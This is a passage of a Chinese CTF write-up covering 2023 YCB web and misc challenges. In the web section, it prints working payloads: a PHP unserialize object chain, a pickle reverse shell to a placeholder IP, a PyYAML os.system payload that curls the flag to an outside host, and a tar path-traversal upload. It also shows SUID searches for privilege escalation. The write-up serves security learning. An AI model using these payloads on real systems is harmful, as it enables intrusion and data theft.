class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><code>O%3A3%3A%22Bei%22%3A3%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A14%3A%22highlight_file%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A19%3A%22%2Ftmp%2Fcatcatf1ag.txt%22%3B%7D</code></p><p>最后那个过滤用<code>highlight_file</code>函数或者双写都可以绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-2.png"></p><h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><p><a href="http://www.zip下载源码/">www.zip下载源码</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> secret<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/verification&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verification</span>():<br>    <span class="hljs-keyword">try</span>:<br>        attribute = session.get(<span class="hljs-string">&#x27;Attribute&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(attribute, <span class="hljs-built_in">dict</span>):<br>            <span class="hljs-keyword">raise</span> Exception<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hacker!!!&#x27;</span><br>    <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;name&#x27;</span>) == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> secret<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Don&#x27;t play tricks on me&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are a perfect stranger to me&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>访问<code>/verification</code>，进行session伪造，得到<code>Hello admin, welcome to /ppppppppppick1e</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-3.png"></p><p>访问<code>/ppppppppppick1e</code>，得到<code>Hint: Source in /src0de</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src0de&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src0de</span>():<br>    f = <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    rsp = f.read()<br>    f.close()<br>    <span class="hljs-keyword">return</span> rsp[rsp.index(<span class="hljs-string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppppppppppick1e</span>():<br>    <span class="hljs-keyword">try</span>:<br>        username = <span class="hljs-string">&quot;admin&quot;</span><br>        rsp = make_response(<span class="hljs-string">&quot;Hello, %s &quot;</span> % username)<br>        rsp.headers[<span class="hljs-string">&#x27;hint&#x27;</span>] = <span class="hljs-string">&quot;Source in /src0de&quot;</span><br>        pick1e = request.cookies.get(<span class="hljs-string">&#x27;pick1e&#x27;</span>)<br>        <span class="hljs-keyword">if</span> pick1e <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            pick1e = base64.b64decode(pick1e)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> rsp<br>        <span class="hljs-keyword">if</span> check(pick1e):<br>            pick1e = pickle.loads(pick1e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Go for it!!!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Way!!!&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-built_in">str</span>(e)<br>        <span class="hljs-keyword">return</span> error_message<br><br>    <span class="hljs-keyword">return</span> rsp<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GWHT</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>pickle反序列化rce</p><p>反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>payload= <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;,port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(payload))<br></code></pre></td></tr></table></figure><p>发现没有权限</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-4.png"></p><p>查找有权限的命令</p><p><code>find /bin/ -perm 777</code>或者<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>发现python3有权限，使用python3读flag<br><code>python3 -c &#39;print(open(&quot;/flag&quot;).read())&#39;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-5.png"></p><h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> *<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] =<span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>)+<span class="hljs-string">&quot;Boogipopisweak&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name=request.args.get(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>)<br>    m1sery=[request.args.get(<span class="hljs-string">&quot;m1sery&quot;</span>,<span class="hljs-string">&quot;Doctor.Boogipop&quot;</span>)]<br>    <span class="hljs-keyword">if</span>(session.get(<span class="hljs-string">&quot;name&quot;</span>)==<span class="hljs-string">&quot;Dr.Boog1pop&quot;</span>):<br>        blacklist=re.findall(<span class="hljs-string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker no way&quot;</span><br>        <span class="hljs-built_in">exec</span>(<span class="hljs-string">f&#x27;for [<span class="hljs-subst">&#123;name&#125;</span>] in [<span class="hljs-subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;Doctor&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,name=session.get(<span class="hljs-string">&quot;name&quot;</span>))<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>        file = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>        fileblacklist=re.findall(<span class="hljs-string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> fileblacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker!&quot;</span><br>        start=request.args.get(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        end=request.args.get(<span class="hljs-string">&quot;end&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        <span class="hljs-keyword">if</span> start==<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">and</span> end==<span class="hljs-string">&quot;0&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>        <span class="hljs-keyword">else</span>:<br>            start,end=<span class="hljs-built_in">int</span>(start),<span class="hljs-built_in">int</span>(end)<br>            f=<span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>)<br>            f.seek(start)<br>            data=f.read(end)<br>            <span class="hljs-keyword">return</span> data<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_page</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-built_in">print</span>(os.path.pardir)<br>    <span class="hljs-built_in">print</span>(path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&quot;templates/&quot;</span> + path):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not found&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> render_template(path)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">False</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br></code></pre></td></tr></table></figure><p>有个任意文件读取，非预期解就直接读环境变量了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-6.png"></p><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    flag = <span class="hljs-literal">True</span><br>    blacklist = [<span class="hljs-string">&#x27;bytes&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;frozenset&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;tuple&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;object&#x27;</span>,<span class="hljs-string">&#x27;listitems&#x27;</span>,<span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;object&#x27;</span>,<span class="hljs-string">&#x27;apply&#x27;</span>]<br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(s).lower():<br>            flag= <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(no)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFile</span>(<span class="hljs-params">filepath, <span class="hljs-built_in">type</span></span>):<br><br>    extractdir = filepath.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractdir):<br>        os.makedirs(extractdir)<br><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;tar&#x27;</span>:<br>        tf = tarfile.TarFile(filepath)<br>        tf.extractall(extractdir)<br>        <span class="hljs-keyword">return</span> tf.getnames()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>        fn = <span class="hljs-string">&#x27;uploads/&#x27;</span> + md5().hexdigest()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fn):<br>            os.makedirs(fn)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        upFile = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(upFile)<br>        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span><br><br>        savePath = <span class="hljs-string">f&quot;uploads/<span class="hljs-subst">&#123;upFile.filename&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(savePath)<br>        upFile.save(savePath)<br><br>        <span class="hljs-keyword">if</span> tarfile.is_tarfile(savePath):<br>            zipDatas = extractFile(savePath, <span class="hljs-string">&#x27;tar&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">if</span> request.args:<br>        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;config/<span class="hljs-subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            Config = yaml.load(f.read())<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, username=<span class="hljs-string">&quot;admin&quot;</span>, message=<span class="hljs-string">&quot;success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>&#x2F;upload路由中上传tar文件，然后通过&#x2F;src路由进行yaml解析，存在PyYAML反序列化漏洞</p><p>poc</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/apply:os.system</span> [<span class="hljs-string">&quot;curl http://ip:7777/?flag=`cat /fl*|base64`&quot;</span>]<br></code></pre></td></tr></table></figure><p>制作tar包<br><code>tar cPvf test.tar ../../config/config.yaml</code></p><p>上传后访问<code>/src?username=config</code>触发</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-7.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ai和nia的交响曲"><a href="#ai和nia的交响曲" class="headerlink" title="ai和nia的交响曲"></a>ai和nia的交响曲</h2><p>upload.php中上传了一个flag1.png</p><p>其中每条黑线到下条黑线恰好8bit，把黑色当成0，白色当成1，竖着读取后转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>)<br>width, height = img.size<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        pixel = img.getpixel((i, j))[<span class="hljs-number">0</span>]<br>        flag += <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">if</span> pixel &gt;= <span class="hljs-number">30</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;0&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;outs.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(flag)<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">8</span>):<br>    byte = flag[i:i+<span class="hljs-number">8</span>]<br>    decimal = <span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>)<br>    result += <span class="hljs-built_in">chr</span>(decimal)<br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>结尾得到<code>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</code></p><p>http流中还有一个flag2.zip，发现是伪加密</p><p>解压后的内容如下，其中还有0宽，但没什么用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">04</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">22</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">04</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">22</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">10</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">13</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">09</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p>在hint中给的视频地址去找字母，得到<code>CAOCAOGAIFAN</code></p><p>组合后为flag：<code>@i_n1a_l0v3S_CAOCAOGAIFAN</code></p><h2 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h2><p>高度不对，先爆破出正确的宽高</p><p>发现两个iend，猜测是snipping的CVE</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-1.png"></p><h2 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h2><p>osfmount挂载，有三个盘</p><p>分别拿到<code>encrypt</code>，<code>normal_rar.rar</code>，<code>not_real_cat.jpg</code></p><p>其中rar可以分离出一张jpg，大小样式与另一张jpg一样，使用双图盲水印</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-2.png"></p><p>使用<code>veracrypt</code>挂载<code>encrypt</code>，密码为<code>watermark_is_fun</code></p><p>拿到<code>KBAUYVCSKR5XK5TYM5SGC3LMNJXWY4BQPBPXSYLVL54TCZLCL5UHUM27NUYTI4JBEEQX2===‌‍</code></p><p>存在零宽隐写，解密后得到<code>Matryoshka</code></p><p>base32后猜测是维吉尼亚</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-3.png"></p><h2 id="程序猿Quby"><a href="#程序猿Quby" class="headerlink" title="程序猿Quby"></a>程序猿Quby</h2><p>QUBY.png可以分离出一个带密码的rar</p><p>图片本身的信息是夏多密码，根据码表转换得到<code>HAVEANICEDAY</code></p><p>注意1，6，12分别表示顺时针旋转180°，90°，0°</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-4.png"></p><p>然后对图片解cloacked-pixel</p><p><code>python2 lsb.py extract QUBY.png out.txt HAVEANICEDAY</code></p><p>得到压缩包密码<code>we1c0met0ycbCTF!!!</code>，解压得到一段wav和两张xlsx表</p><p>xlsx表中有外源数据被隐藏了，大约是中间50行~1000行的部分被折叠了，展开再改颜色能看到两种不同的数字</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-5.png"></p><p>python提取数字后转换成10，画图后两张图拼在一起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span 